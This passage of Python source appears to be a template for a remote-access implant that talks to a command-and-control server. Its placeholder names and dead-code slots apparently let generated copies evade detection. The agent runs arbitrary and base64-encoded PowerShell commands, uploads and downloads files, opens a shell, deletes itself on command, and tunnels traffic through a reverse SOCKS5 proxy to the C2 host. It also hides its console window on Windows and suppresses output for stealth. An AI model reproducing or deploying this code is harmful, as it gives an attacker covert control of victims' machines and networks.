                        for task in tasks:
                            command = task.get('command', '')
                            task_id = task.get('id', 'unknown')

                            if command.startswith('pwsh '):
                                try:
                                    encoded_script = command[5:]  # Remove "pwsh " prefix
                                    decoded_script = base64.b64decode(encoded_script).decode('utf-8')
                                    result = self.{m_exec}(decoded_script)
                                except Exception as e:
                                    result = f"[ERROR] Failed to decode and execute pwsh: {{str(e)}}"
                            elif command.startswith('upload '):
                                result = self.{m_handle_upload}(command)
                            elif command.startswith('download '):
                                result = self.{m_handle_download}(command)
                            elif command.startswith('tty_shell'):
                                result = self.{m_handle_direct_shell}(command)
                            elif command.startswith('sleep '):
                                try:
                                    parts = command.split(' ', 1)
                                    if len(parts) == 2:
                                        new_sleep = int(parts[1])
                                        if new_sleep > 0:
                                            self.{v_heartbeat} = new_sleep
                                            result = f"[SUCCESS] Sleep interval changed to {{new_sleep}} seconds"
                                        else:
                                            result = "[ERROR] Sleep interval must be a positive integer"
                                    else:
                                        result = "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
                                except ValueError:
                                    result = "[ERROR] Sleep interval must be a valid integer"
                                except Exception as e:
                                    result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
                            elif command.startswith('kill'):
                                self.{m_self_delete}()
                            elif command == 'reverse_proxy_start':
                                # Start reverse proxy in a separate thread
                                proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
                                proxy_thread.start()
                                result = "[SUCCESS] Reverse proxy started."
                            elif command == 'reverse_proxy_stop':
                                self.{m_stop_reverse_proxy}()
                                result = "[SUCCESS] Reverse proxy stopped."
                            else:
                                result = self.{m_exec}(command)

                        # Submit task result with failover handling
                        submission_success = self.{m_submit}(task_id, result)
                        if submission_success:
                            # Reset failure count on successful result submission
                            self.{m_reset_fail_count}()
                        else:
                            # Increment failure count if submission fails
                            self.{m_increment_fail_count}()
                            # Don't print anything for stealth

                if self.{v_interactive_mode}:
                    sleep_time = 2
                else:
                    base_sleep = self.{v_heartbeat}
                    jitter_factor = (random.random() - 0.5) * 2 * self.{v_jitter}
                    sleep_time = max(5, base_sleep * (1 + jitter_factor))

                # If no tasks were fetched (None was returned), increment failure count
                if tasks is None:
                    self.{m_increment_fail_count}()

                time.sleep(sleep_time)

            except KeyboardInterrupt:
                self.{v_running} = False
            except Exception:
                time.sleep(30)
        {dead_code_3}

    def {m_stop_agent}(self):
        self.{v_running} = False
        self.{m_exit_interactive_mode}()
        # P2P functionality has been removed
        {dead_code_4}

    def {m_start_reverse_proxy}(self):
        if self.{v_reverse_proxy_active}:
            return

        self.{v_reverse_proxy_active} = True
        self.{v_reverse_proxy_stop_event}.clear()

        try:
            import socket
            import struct
            import threading
            import select

            # Parse the C2 URL to get the host
            if self.{v_current_c2_url}.startswith('https://'):
                host = self.{v_current_c2_url}[8:]  # Remove 'https://'
            else:
                host = self.{v_current_c2_url}[7:]  # Remove 'http://'

            # Extract host and port (we don't need c2_port for reverse proxy)
            if ':' in host:
                host, port_str = host.split(':', 1)

            # Connect to the C2 server on port 5555 for reverse proxy
            remote_addr = (host, 5555)

            while self.{v_running} and not self.{v_reverse_proxy_stop_event}.is_set():
                try:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    # Set timeout for connection attempt
                    conn.settimeout(10)
                    conn.connect(remote_addr)

                    # Clear timeout for data transfer
                    conn.settimeout(None)

                    # Handle SOCKS5 protocol on this connection
                    self.{m_handle_socks5}(conn)
                    conn.close()

                    # Check if stop was requested before reconnecting
                    if self.{v_reverse_proxy_stop_event}.is_set():
                        break

                    time.sleep(2)  # Wait before reconnecting

                except Exception:
                    if self.{v_reverse_proxy_stop_event}.is_set():
                        break
                    time.sleep(5)  # Wait before retrying
                    continue

        except Exception:
            pass
        finally:
            self.{v_reverse_proxy_active} = False

    def {m_stop_reverse_proxy}(self):
        if not self.{v_reverse_proxy_active}:
            return

        self.{v_reverse_proxy_stop_event}.set()

        # Wait for the proxy to fully stop
        import time
        timeout = 10  # 10 second timeout
        start_time = time.time()
        while self.{v_reverse_proxy_active} and (time.time() - start_time) < timeout:
            time.sleep(0.1)

    def {m_handle_socks5}(self, server_conn):
        try:
            # Set timeout for initial handshake
            server_conn.settimeout(30)

            # Read greeting from client (should be from C2 server acting as SOCKS client)
            greeting = server_conn.recv(2)
            if not greeting or len(greeting) != 2 or greeting[0] != 0x05:
                server_conn.close()
                return

            n_methods = greeting[1]
            if n_methods <= 0 or n_methods > 255:
                server_conn.close()
                return

            # Read the methods
            methods = server_conn.recv(n_methods)
            if not methods:
                server_conn.close()
                return

            # Send response: version 5, no authentication
            server_conn.sendall(b'\x05\x00')

            # Clear timeout for main connection
            server_conn.settimeout(None)

            # Handle multiple SOCKS requests over the same connection
            while True:
                # Read request header
                header = server_conn.recv(4)
                if not header or len(header) != 4 or header[0] != 0x05:
                    break

                cmd = header[1]
                if cmd != 0x01:  # CONNECT command only
                    # Send error response
                    server_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
                    continue

                addr_type = header[3]

                # Read address and port
                if addr_type == 0x01:  # IPv4
                    addr_bytes = server_conn.recv(4)
                    port_bytes = server_conn.recv(2)
                    if not addr_bytes or not port_bytes:
                        break
                    addr = socket.inet_ntoa(addr_bytes)
                elif addr_type == 0x03:  # Domain name
                    addr_len = ord(server_conn.recv(1))
                    addr_bytes = server_conn.recv(addr_len)
                    if not addr_bytes:
                        break
                    addr = addr_bytes.decode('utf-8')

                    port_bytes = server_conn.recv(2)
                    if not port_bytes:
                        break
                    # Agent-side DNS resolution - prefer IPv4 then IPv6
                    resolved_addr = None
                    try:
                        import socket
                        # Try IPv4 first
                        try:
                            result = socket.getaddrinfo(addr, None, socket.AF_INET, socket.SOCK_STREAM)
                            for res in result:
                                ip = res[4][0]
                                if ip and not (ip.startswith("0.") or ip.startswith("169.254")):  # Skip invalid IPs
                                    resolved_addr = ip
                                    break
                        except:
                            pass

                        # If IPv4 failed, try IPv6
                        if not resolved_addr:
                            try:
                                result = socket.getaddrinfo(addr, None, socket.AF_INET6, socket.SOCK_STREAM)
                                for res in result:
                                    ip = res[4][0]
                                    if ip and not ip.startswith("fe80"):  # Skip link-local IPv6
                                        resolved_addr = ip
                                        break
                            except:
                                pass
                    except:
                        pass

                    if not resolved_addr:
                        # Send error response for DNS failure
                        server_conn.sendall(b'\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00')  # Host unreachable
                        continue
                    else:
                        addr = resolved_addr
                elif addr_type == 0x04:  # IPv6
                    addr_bytes = server_conn.recv(16)
                    port_bytes = server_conn.recv(2)
                    if not addr_bytes or not port_bytes:
                        break
                    addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
                else:
                    # Send error response
                    server_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
                    continue

                port = struct.unpack('>H', port_bytes)[0]

                # Connect to target
                try:
                    target_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target_conn.connect((addr, port))

                    # Send success response
                    server_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')

                    # Relay data between server connection and target connection
                    self.{m_relay_data}(server_conn, target_conn)

                except Exception:
                    # Send connection refused response
                    server_conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                    # Continue to accept next SOCKS request on same server connection
                    continue

        except Exception:
            pass
        finally:
            try:
                server_conn.close()
            except:
                pass

    def {m_relay_data}(self, conn1, conn2):
        import threading

        def relay(src, dst, name1, name2):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception:
                pass
            finally:
                # Properly close write side to signal end of data
                try:
                    if hasattr(socket, 'SHUT_WR'):
                        src.shutdown(socket.SHUT_RD)  # Stop reading on source
                        dst.shutdown(socket.SHUT_WR)  # Stop writing to destination
                    else:
                        src.close()
                        dst.close()
                except:
                    try:
                        src.close()
                        dst.close()
                    except:
                        pass

        # Start two threads for bidirectional relay
        thread1 = threading.Thread(target=relay, args=(conn1, conn2, "conn1", "conn2"), daemon=True)
        thread2 = threading.Thread(target=relay, args=(conn2, conn1, "conn2", "conn1"), daemon=True)

        thread1.start()
        thread2.start()

        # Wait for both threads to complete
        thread1.join(timeout=60)
        thread2.join(timeout=60)

        # Ensure both connections are closed
        try:
            conn1.close()
        except:
            pass
        try:
            conn2.close()
        except:
            pass

if __name__ == '__main__':
    try:
        import platform
        if platform.system().lower() == 'windows':
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    except:
        pass
    
    agent = {class_name}()
    
    try:
        from cryptography.fernet import Fernet
        agent.{v_secret_key} = "{secret_key}"
        agent.{v_fernet} = Fernet(agent.{v_secret_key}.encode())
    except Exception as e:
        pass
    
    try:
        agent.{m_run}()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
    finally:
        agent.{m_stop_agent}()
